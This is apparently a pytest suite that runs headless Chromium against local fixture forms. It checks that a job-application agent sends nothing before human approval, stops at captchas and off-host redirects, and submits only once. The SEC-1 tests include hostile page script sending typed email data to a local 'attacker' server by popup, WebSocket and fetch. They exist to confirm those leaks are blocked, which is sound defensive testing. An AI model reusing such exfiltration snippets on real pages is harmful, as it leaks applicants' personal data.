"""Real headless Chromium against LOCAL fixture pages (tests/fixtures/forms) served on 127.0.0.1.

The fixture server records every request (``requests``) and every non-GET body
(``posts``) so the tests can assert that preparing an application sends
nothing. A second "attacker" server (another port on 127.0.0.1, reached as
``localhost`` and as ``127.0.0.1``) records everything that reaches it; hostile
fixture pages try to send typed data there. Most tests run in strict mode
(``block_third_party_requests``), the SEC-1 tests also in the default mode.
Nothing leaves the machine. Skipped cleanly when Chromium cannot be launched.
"""

from __future__ import annotations

import hashlib
import http.server
import threading
from dataclasses import replace
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import pytest
import yaml

from job_agent.applications import service
from job_agent.browser.errors import ChallengeDetected, NavigationBlocked
from job_agent.browser.policy import NavigationPolicy
from job_agent.browser.session import BrowserOptions, PlaywrightBrowser, chromium_launchable
from job_agent.database import repo
from job_agent.errors import ApprovalError, HumanActionRequired, PermissionDenied
from job_agent.models import PipelineState as S
from job_agent.utils.time import utcnow_iso

pytestmark = pytest.mark.browser

FORMS = Path(__file__).resolve().parents[1] / "fixtures" / "forms"


# --------------------------------------------------------------------------- #
# Local fixture server
# --------------------------------------------------------------------------- #
class _RecordingHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):  # keep test output quiet
        pass

    def _send(self, status: int, body: bytes = b"", headers: dict[str, str] | None = None) -> None:
        self.send_response(status)
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        if body:
            self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _body(self) -> bytes:
        length = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(length) if length else b""


class FixtureServer:
    """The employer's official site: serves tests/fixtures/forms and records every request."""

    def __init__(self) -> None:
        self.posts: list[tuple[str, bytes]] = []  # every non-GET request: (path, body)
        self.requests: list[tuple[str, str]] = []  # every request: (method, path)
        self.attacker_port = 0
        self.stop = threading.Event()
        outer = self

        class Handler(_RecordingHandler):
            def do_GET(self):
                outer.requests.append(("GET", self.path))
                parts = urlsplit(self.path)
                if parts.path == "/redirect-offhost":
                    port = outer.port
                    return self._send(302, headers={"Location": f"http://localhost:{port}/forms/simple_form.html"})
                if parts.path == "/apply/confirm":
                    return self._send(200, (FORMS / "review_step.html").read_bytes())
                if parts.path.startswith("/forms/"):
                    file = FORMS / parts.path.removeprefix("/forms/")
                    if file.is_file() and file.parent == FORMS:
                        query = parse_qs(parts.query)
                        outcome = query.get("outcome", ["confirm"])[0]
                        html = (file.read_text(encoding="utf-8")
                                .replace("__SUBMIT_ACTION__", f"/submit/{outcome}")
                                .replace("__ATTACKER_IP__", f"http://127.0.0.1:{outer.attacker_port}")
                                .replace("__ATTACKER__", f"http://localhost:{outer.attacker_port}")
                                .replace("__IFRAME_POST__", "false" if query.get("iframe") == ["0"] else "true"))
                        return self._send(200, html.encode())
                return self._send(404, b"<h1>Not found</h1>")

            def _non_get(self):
                body = self._body()
                outer.requests.append((self.command, self.path))
                outer.posts.append((self.path, body))
                if self.path == "/submit/confirm":
                    return self._send(303, headers={"Location": "/forms/thank-you.html"})
                if self.path == "/submit/review":
                    return self._send(303, headers={"Location": "/apply/confirm"})
                if self.path == "/submit/screening":
                    return self._send(200, (FORMS / "screening_step.html").read_bytes())
                if self.path == "/submit/xhr":
                    return self._send(200, b"ok")
                if self.path == "/submit/validation":
                    return self._send(200, (FORMS / "validation_result.html").read_bytes())
                if self.path == "/submit/hang":
                    outer.stop.wait(60)
                    return self._send(200, b"<p>late</p>")
                return self._send(404, b"<h1>Not found</h1>")

            do_POST = do_PUT = do_PATCH = do_DELETE = _non_get

        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.httpd.daemon_threads = True
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def url(self, path: str) -> str:
        return f"http://127.0.0.1:{self.port}{path}"

    def non_get(self) -> list[tuple[str, str]]:
        return [r for r in self.requests if r[0] not in {"GET", "HEAD"}]

    def __enter__(self) -> "FixtureServer":
        self.thread.start()
        return self

    def __exit__(self, *exc) -> None:
        self.stop.set()
        self.httpd.shutdown()
        self.httpd.server_close()


class AttackerServer:
    """A host that is NOT the job's: records every request (incl. WebSocket upgrades) that reaches it."""

    def __init__(self) -> None:
        self.hits: list[tuple[str, str, str]] = []  # (method, Host header, path)
        outer = self

        class Handler(_RecordingHandler):
            def _any(self):
                self._body()
                outer.hits.append((self.command, self.headers.get("Host") or "", self.path))
                return self._send(200, b"<p>x</p>")

            do_GET = do_POST = do_PUT = do_PATCH = do_DELETE = do_HEAD = _any

        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.httpd.daemon_threads = True
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def __enter__(self) -> "AttackerServer":
        self.thread.start()
        return self

    def __exit__(self, *exc) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture(scope="module")
def chromium():
    ok, why = chromium_launchable(headless=True)
    if not ok:
        pytest.skip(f"Chromium cannot be launched here: {why}")


@pytest.fixture
def attacker(chromium):
    with AttackerServer() as srv:
        yield srv


@pytest.fixture
def server(chromium, attacker):
    with FixtureServer() as srv:
        srv.attacker_port = attacker.port
        yield srv


def offline_factory(options: BrowserOptions) -> PlaywrightBrowser:
    """The real browser, but every request to a non-allowlisted host is aborted."""
    return PlaywrightBrowser(replace(options, block_third_party_requests=True))


# --------------------------------------------------------------------------- #
# Data helpers
# --------------------------------------------------------------------------- #
def _setup(ctx, make_job, url: str) -> dict:
    db = ctx.db
    job_id = make_job(job_url=url, job_url_canonical=url, application_url=url)
    app_id = repo.create_application(db, job_id, actor="system", application_url=url)
    doc_ids = []
    for doc_type, fmt, content in (("resume", "pdf", b"%PDF-1.4 fixture resume"),
                                   ("cover_letter", "pdf", b"%PDF-1.4 fixture cover letter")):
        rel = Path(f"Fixture-Corp-{job_id}") / f"Fixture-Corp_Analyst_{doc_type}.{fmt}"
        path = ctx.config.documents_dir / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content)
        doc_ids.append(db.insert("document_versions", {
            "job_id": job_id, "doc_type": doc_type, "version": 1, "format": fmt, "file_name": rel.name,
            "relative_path": rel.as_posix(), "sha256": hashlib.sha256(content).hexdigest(), "status": "approved",
            "generator": "rules", "profile_hash": "test", "created_at": utcnow_iso()}))
    db.update("applications", app_id, {"resume_document_id": doc_ids[0], "cover_letter_document_id": doc_ids[1]})
    repo.transition_application(db, app_id, S.DOCUMENTS_READY, actor="system")
    app = repo.get_application(db, app_id)
    job_uid = db.scalar("SELECT job_uid FROM jobs WHERE id = ?", (job_id,))
    return {"app_id": app_id, "app_uid": app["application_uid"], "job_uid": job_uid}


def _profile_with_answers(ctx) -> None:
    path = ctx.config.profile_path
    data = yaml.safe_load(path.read_text())
    data["verified_answers"].append({"id": "sponsorship", "question_patterns": ["require visa sponsorship"],
                                     "answer": "No", "is_legal_declaration": True})
    # Set, but must never be used to answer legal questions.
    data["work_authorization"].update(authorized_to_work_in_us_now=True, requires_sponsorship_now=False,
                                      requires_sponsorship_future=False)
    path.write_text(yaml.safe_dump(data, sort_keys=False))
    ctx.reload_profile()


def _answers(ctx, app_id: int) -> dict[str, dict]:
    return {r["field_key"]: dict(r) for r in ctx.db.query_all(
        "SELECT * FROM application_answers WHERE application_id = ?", (app_id,))}


def _approve_simple(ctx, make_job, server, outcome: str, page: str = "simple_form.html",
                    factory=None) -> tuple[dict, str]:
    _profile_with_answers(ctx)
    query = f"outcome={outcome}" + ("&iframe=0" if page == "leaky_form.html" else "")
    info = _setup(ctx, make_job, server.url(f"/forms/{page}?{query}"))
    prep = service.prepare_application(ctx, info["job_uid"], browser_factory=factory or offline_factory)
    assert prep.status == S.AWAITING_APPROVAL, prep.message
    assert server.posts == [] and server.non_get() == []
    approval_uid = service.set_answer(ctx, info["app_uid"], "certify", "yes")
    service.decide(ctx, approval_uid, approve=True, actor="cli")
    ctx.config.applications.browser_submission_enabled = True
    return info, approval_uid


@pytest.fixture(autouse=True)
def _fast_timeouts(ctx):
    ctx.config.applications.browser_timeout_seconds = 10


# --------------------------------------------------------------------------- #
# Session level
# --------------------------------------------------------------------------- #
def test_inspect_fill_and_read_back_on_real_page(server, tmp_path):
    url = server.url("/forms/generic_form.html")
    policy = NavigationPolicy.for_job(job_url=url, application_url=None)
    upload = tmp_path / "resume.pdf"
    upload.write_bytes(b"%PDF-1.4 x")
    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
        page = browser.open_application(url, policy)
        fields = {f.key: f for f in page.inspect_form()}
        assert "hp_company" not in fields and "q" not in fields  # honeypot and search box skipped
        assert fields["email"].label == "Email" and fields["email"].required
        assert fields["work_auth"].type == "radio" and [o.label for o in fields["work_auth"].options] == ["Yes", "No"]
        assert fields["linkedin"].label == "LinkedIn profile URL" and fields["website"].label == "Portfolio / website"
        page.fill(fields["first_name"], "Test")
        page.fill(fields["source"], "Company careers page")
        page.fill(fields["work_auth"], "No")
        page.fill(fields["certify"], "yes")
        page.attach_file(fields["resume"], upload)
        assert page.read_value(fields["first_name"]) == "Test"
        assert page.read_value(fields["source"]) == "Company careers page"
        assert page.read_value(fields["work_auth"]) == "No"
        assert page.read_value(fields["certify"]) == "yes"
        assert page.read_value(fields["resume"]) == "resume.pdf"
        assert page.find_submit().text == "Submit application"
        assert page.validation_errors() == []
    assert server.posts == []


def test_recaptcha_page_raises_human_action_required(server):
    url = server.url("/forms/recaptcha.html")
    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
        with pytest.raises(ChallengeDetected) as exc:
            browser.open_application(url, NavigationPolicy.for_job(job_url=url, application_url=None))
    assert isinstance(exc.value, HumanActionRequired) and exc.value.challenge_kind == "captcha"
    assert server.posts == []


def test_offhost_redirect_refused(server):
    start = server.url("/redirect-offhost")
    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
        with pytest.raises(NavigationBlocked) as exc:
            browser.open_application(start, NavigationPolicy.for_job(job_url=start, application_url=None))
        with pytest.raises(NavigationBlocked):  # never opens a URL off the job's host in the first place
            browser.open_application("http://localhost:1/x", NavigationPolicy.for_job(job_url=start,
                                                                                      application_url=None))
    assert "localhost" in exc.value.url
    assert server.posts == []


# --------------------------------------------------------------------------- #
# Preparation
# --------------------------------------------------------------------------- #
def test_prepare_generic_form_fills_verified_fields_only(ctx, make_job, server):
    _profile_with_answers(ctx)
    info = _setup(ctx, make_job, server.url("/forms/generic_form.html"))
    result = service.prepare_application(ctx, info["job_uid"], browser_factory=offline_factory)
    assert result.status == S.AWAITING_APPROVAL, result.message
    assert server.posts == []  # preparing never submits
    a = _answers(ctx, info["app_id"])
    for key, value in {"first_name": "Test", "last_name": "Candidate", "email": "test.candidate@example.com",
                       "phone": "+1 315 555 0100", "city": "Springfield", "school": "Example State University",
                       "degree": "Master of Science", "graduation": "May 2027", "source": "Company careers page",
                       "sponsorship": "No"}.items():
        assert a[key]["answer"] == value and a[key]["confidence"] == "verified", key
    assert a["resume"]["answer"].endswith(".pdf") and a["cover_letter"]["answer_source"].startswith("document:")
    assert a["sponsorship"]["is_legal_declaration"] == 1 and a["sponsorship"]["requires_review"] == 1
    # Legal (no verified answer), EEO and agreement fields untouched and flagged.
    assert a["work_auth"]["answer"] is None and a["work_auth"]["is_legal_declaration"] == 1
    for key in ("gender", "veteran", "certify", "salary", "why"):
        assert a[key]["answer"] is None and a[key]["requires_review"] == 1, key
    assert not any("could not be entered" in (r["review_reason"] or "") for r in a.values())
    assert result.filled == 12  # 10 text/choice values + résumé + cover letter uploads
    assert result.screenshot and (ctx.config.data_dir / result.screenshot).stat().st_size > 1000
    payload = repo.approval_payload(repo.get_approval(ctx.db, result.approval_uid))
    assert {d["field_key"] for d in payload["legal_declarations"]} == {"work_auth", "sponsorship"}
    assert {d["field_key"] for d in payload["agreements"]} == {"certify"}


def test_prepare_greenhouse_and_lever_like_pages(ctx, make_job, server):
    gh = _setup(ctx, make_job, server.url("/forms/greenhouse_like.html"))
    assert service.prepare_application(ctx, gh["job_uid"], browser_factory=offline_factory).status \
        == S.AWAITING_APPROVAL
    a = _answers(ctx, gh["app_id"])
    assert a["job_application[first_name]"]["answer"] == "Test"
    assert a["job_application[location]"]["answer"] == "Springfield, NY"
    assert a["job_application[resume]"]["confidence"] == "verified"  # visually hidden file input still attached
    assert a["job_application[answers_attributes][4][text_value]"]["answer"] == "Company careers page"
    assert a["job_application[educations][][discipline]"]["answer"] == "Information Systems"
    for key in ("job_application[answers_attributes][2][boolean_value]",
                "job_application[answers_attributes][3][boolean_value]"):
        assert a[key]["is_legal_declaration"] == 1 and a[key]["answer"] is None
    for key in ("job_application[gender]", "job_application[race]", "job_application[veteran_status]",
                "job_application[disability_status]", "job_application[answers_attributes][5][text_value]"):
        assert a[key]["requires_review"] == 1 and a[key]["answer"] is None, key

    lv = _setup(ctx, make_job, server.url("/forms/lever_like.html"))
    assert service.prepare_application(ctx, lv["job_uid"], browser_factory=offline_factory).status \
        == S.AWAITING_APPROVAL
    b = _answers(ctx, lv["app_id"])
    assert b["name"]["answer"] == "Test Candidate" and b["email"]["answer"] == "test.candidate@example.com"
    assert b["cards[a1b2][field0]"]["is_legal_declaration"] == 1 and b["cards[a1b2][field0]"]["answer"] is None
    assert b["cards[a1b2][field1]"]["is_legal_declaration"] == 1  # security clearance
    assert b["consent[privacy]"]["requires_review"] == 1 and b["consent[privacy]"]["answer"] is None
    assert b["eeo[gender]"]["requires_review"] == 1 and b["eeo[pronouns]"]["requires_review"] == 1
    assert b["org"]["requires_review"] == 1 and b["cards[a1b2][field2]"]["requires_review"] == 1
    assert b["urls[LinkedIn]"]["answer"] is None  # not in the profile: left blank
    assert server.posts == []


@pytest.mark.parametrize("page,kind", [("recaptcha.html", "captcha"), ("login_wall.html", "login")])
def test_prepare_stops_at_challenges(ctx, make_job, server, page, kind):
    info = _setup(ctx, make_job, server.url(f"/forms/{page}"))
    result = service.prepare_application(ctx, info["job_uid"], browser_factory=offline_factory)
    assert result.status == S.NEEDS_MANUAL_ACTION and result.challenge == kind
    assert "Apply manually at http://127.0.0.1" in result.message
    assert server.posts == [] and _answers(ctx, info["app_id"]) == {}


def test_prepare_offhost_redirect_needs_manual_action(ctx, make_job, server):
    info = _setup(ctx, make_job, server.url("/redirect-offhost"))
    result = service.prepare_application(ctx, info["job_uid"], browser_factory=offline_factory)
    assert result.status == S.NEEDS_MANUAL_ACTION and "leave the official site" in result.message
    assert server.posts == []


# --------------------------------------------------------------------------- #
# Submission
# --------------------------------------------------------------------------- #
def test_browser_submission_disabled_is_permission_denied(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm")
    ctx.config.applications.browser_submission_enabled = False
    with pytest.raises(PermissionDenied):
        service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert server.posts == []


def test_submit_reaches_confirmation_page_once(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm")
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "submitted" and result.status == S.SUBMITTED, result.message
    assert len(server.posts) == 1
    path, body = server.posts[0]
    assert path == "/submit/confirm"
    assert b'name="first_name"\r\n\r\nTest\r\n' in body and b'name="sponsorship"\r\n\r\nNo\r\n' in body
    assert b'name="certify"\r\n\r\n1\r\n' in body and b"%PDF-1.4 fixture resume" in body
    ev = result.evidence
    assert ev["type"] == "page" and ev["url"].endswith("/forms/thank-you.html")
    assert "Thank you for applying" in ev["matched_text"] and ev["screenshot"]
    app = repo.get_application(ctx.db, info["app_id"])
    assert app["status"] == "submitted" and app["confirmation_status"] == "page_evidence"
    with pytest.raises(ApprovalError, match="already used"):
        service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert len(server.posts) == 1


def test_submit_with_validation_errors_marks_failed(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "validation")
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "failed" and result.status == S.FAILED
    assert "Phone number is invalid" in result.validation_errors
    assert len(server.posts) == 1


def test_submit_hang_is_unknown_outcome_and_never_retried(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "hang")
    ctx.config.applications.browser_timeout_seconds = 3
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "unknown" and result.status == S.NEEDS_MANUAL_ACTION
    assert len(server.posts) == 1
    assert ctx.db.scalar("SELECT COUNT(*) FROM errors WHERE application_id = ? AND error_kind = 'unknown_outcome'",
                         (info["app_id"],)) == 1
    ctx.config.applications.browser_timeout_seconds = 10
    # Re-preparing is refused until you confirm it was not submitted ...
    with pytest.raises(HumanActionRequired, match="UNKNOWN outcome"):
        service.prepare_application(ctx, info["job_uid"], browser_factory=offline_factory)
    # ... and even then a fresh prepare + answer + approval cannot trigger another automatic submission.
    service.prepare_application(ctx, info["job_uid"], browser_factory=offline_factory, confirm_not_submitted=True)
    fresh = service.set_answer(ctx, info["app_uid"], "certify", "yes")
    service.decide(ctx, fresh, approve=True, actor="cli")
    with pytest.raises(service.SubmissionBlocked, match="unknown outcome"):
        service.submit_approved(ctx, fresh, browser_factory=offline_factory)
    assert len(server.posts) == 1


def test_changed_answer_after_approval_is_refused(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm")
    ctx.db.execute("UPDATE application_answers SET answer = 'Yes' WHERE application_id = ? AND field_key = ?",
                   (info["app_id"], "sponsorship"))
    with pytest.raises(ApprovalError, match="changed after approval"):
        service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert server.posts == [] and repo.get_approval(ctx.db, approval_uid)["status"] == "approved"


# --------------------------------------------------------------------------- #
# SEC-1: nothing leaves the browser before the approved click
# --------------------------------------------------------------------------- #
def default_factory_fast(options: BrowserOptions) -> PlaywrightBrowser:
    """The production default (third-party GETs allowed until filling begins)."""
    return PlaywrightBrowser(replace(options, block_third_party_requests=False))


@pytest.mark.parametrize("factory", [offline_factory, default_factory_fast], ids=["strict", "default"])
def test_prepare_sends_nothing_before_approval(ctx, make_job, server, attacker, factory):
    """Hostile autosave page: same-host fetch/PUT/beacon, a real form post into a hidden iframe,
    beacons / fetch / pixels / WebSockets / iframes to another host and another port."""
    _profile_with_answers(ctx)
    info = _setup(ctx, make_job, server.url("/forms/leaky_form.html"))
    result = service.prepare_application(ctx, info["job_uid"], browser_factory=factory)
    assert result.status == S.AWAITING_APPROVAL, result.message
    assert result.filled >= 5  # it did fill the form (and so fired every leak handler)
    assert repo.get_approval(ctx.db, result.approval_uid)["status"] == "pending"
    # ZERO non-GET requests reached the official host: no autosave, no iframe form post.
    assert server.non_get() == [] and server.posts == []
    assert not any("autosave" in path for _, path in server.requests)
    # Nothing typed reached the attacker. In the default mode the page could load its third-party
    # logo *before* filling began; nothing after that.
    expected = [] if factory is offline_factory else [("GET", f"localhost:{attacker.port}", "/static/logo.png")]
    assert attacker.hits == expected
    assert not any(b"test.candidate" in body or b"fixture resume" in body for _, body in server.posts)


def test_popups_and_new_windows_never_reach_anyone(ctx, make_job, server, attacker):
    info = _setup(ctx, make_job, server.url("/forms/popup_form.html"))
    result = service.prepare_application(ctx, info["job_uid"], browser_factory=default_factory_fast)
    assert result.status == S.NEEDS_MANUAL_ACTION and "new window" in result.message
    assert attacker.hits == [] and server.non_get() == []


def test_session_guard_blocks_popups_websockets_and_iframes(server, attacker):
    """Session level (cf. review repro): popup, WebSocket, fetch, iframe and pixel after filling began."""
    port = attacker.port
    url = server.url("/forms/leaky_form.html?iframe=0")
    policy = NavigationPolicy.for_job(job_url=url, application_url=None)
    with PlaywrightBrowser(BrowserOptions(timeout_seconds=10)) as browser:
        page = browser.open_application(url, policy)
        fields = {f.key: f for f in page.inspect_form()}
        page.fill(fields["email"], "jane.doe@example.com")
        page.raw_page.evaluate(f"""() => {{
            window.open('http://localhost:{port}/popup?e=jane');
            try {{ new WebSocket('ws://127.0.0.1:{port}/ws-direct?e=jane'); }} catch (e) {{}}
            fetch('http://127.0.0.1:{port}/fetch-get?e=jane', {{mode: 'no-cors'}}).catch(() => {{}});
        }}""")
        page.raw_page.locator("#email").blur()
        page.wait(1.5)
        with pytest.raises(NavigationBlocked, match="new window"):
            page.check_navigation()
    assert attacker.hits == [("GET", f"localhost:{port}", "/static/logo.png")]  # before filling only
    assert server.non_get() == []
    blocked = page.blocked_requests
    kinds = {method for method, _, _ in blocked}
    assert {"WEBSOCKET", "POST", "PUT", "GET"} <= kinds
    assert all("?" not in u for _, u, _ in blocked)  # typed data (query strings) is never logged


def test_armed_submission_posts_once_and_only_to_the_official_host(ctx, make_job, server, attacker):
    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm", page="leaky_form.html",
                                         factory=default_factory_fast)
    attacker.hits.clear()
    result = service.submit_approved(ctx, approval_uid, browser_factory=default_factory_fast)
    assert result.outcome == "submitted" and result.status == S.SUBMITTED, result.message
    # Re-filling fired every leak handler again: still no autosave; exactly the one approved post.
    assert server.non_get() == [("POST", "/submit/confirm")]
    assert b"%PDF-1.4 fixture resume" in server.posts[0][1]
    assert attacker.hits == [("GET", f"localhost:{attacker.port}", "/static/logo.png")]


def test_xhr_submission_is_allowed_only_after_the_approved_click(ctx, make_job, server, attacker):
    info, approval_uid = _approve_simple(ctx, make_job, server, "xhr", page="xhr_submit_form.html")
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "submitted" and result.status == S.SUBMITTED, result.message
    assert server.non_get() == [("POST", "/submit/xhr")]
    assert "Application submitted" in result.evidence["matched_text"]
    assert attacker.hits == []  # the submit-time beacon to another host stayed blocked while armed


# --------------------------------------------------------------------------- #
# C5: intermediate pages are never recorded as submitted
# --------------------------------------------------------------------------- #
def test_review_step_at_apply_confirm_is_unknown_not_submitted(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "review")
    ctx.config.applications.browser_timeout_seconds = 3
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "unknown" and result.status == S.NEEDS_MANUAL_ACTION, result.message
    assert "intermediate / review step" in result.message
    assert server.non_get() == [("POST", "/submit/review")]
    app = repo.get_application(ctx.db, info["app_id"])
    assert app["status"] == S.NEEDS_MANUAL_ACTION.value and app["confirmation_status"] != "page_evidence"
    assert ctx.db.scalar("SELECT COUNT(*) FROM errors WHERE application_id = ? AND error_kind = 'unknown_outcome'",
                         (info["app_id"],)) == 1


def test_screening_step_with_validation_error_is_not_submitted(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "screening")
    ctx.config.applications.browser_timeout_seconds = 3
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.status != S.SUBMITTED and result.outcome == "failed", result.message
    assert any("required" in e for e in result.validation_errors)
    assert server.non_get() == [("POST", "/submit/screening")]


def test_wizard_with_only_a_continue_button_is_never_clicked(ctx, make_job, server):
    info, approval_uid = _approve_simple(ctx, make_job, server, "confirm", page="wizard_continue.html")
    result = service.submit_approved(ctx, approval_uid, browser_factory=offline_factory)
    assert result.outcome == "not_submitted" and result.status == S.NEEDS_MANUAL_ACTION
    assert "no submit button" in result.message
    assert server.non_get() == [] and repo.get_approval(ctx.db, approval_uid)["status"] == "approved"


def test_find_submit_accepts_only_final_submit_labels(server):
    url = server.url("/forms/wizard_continue.html")
    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
        page = browser.open_application(url, NavigationPolicy.for_job(job_url=url, application_url=None))
        assert page.find_submit() is None
        page.raw_page.evaluate("() => { document.querySelector('#continue-btn').textContent = 'Submit'; }")
        assert page.find_submit().text == "Submit"
    gh = server.url("/forms/greenhouse_like.html")
    with offline_factory(BrowserOptions(timeout_seconds=10)) as browser:
        page = browser.open_application(gh, NavigationPolicy.for_job(job_url=gh, application_url=None))
        assert page.find_submit().text == "Submit Application"
    assert server.non_get() == []
